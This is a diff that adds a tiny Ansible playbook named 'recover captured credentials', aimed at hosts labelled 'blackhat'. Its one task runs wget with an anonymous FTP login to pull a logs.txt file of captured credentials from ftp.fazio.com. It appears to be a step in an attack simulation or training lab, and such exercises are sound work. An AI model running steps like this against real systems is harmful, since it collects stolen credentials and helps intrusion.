@@ -1,0 +1,9 @@
+---
+#
+# download log file
+#
+- name: recover captured credentials
+  hosts: blackhat
+  tasks:
+    - name: download log file from ftp
+      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
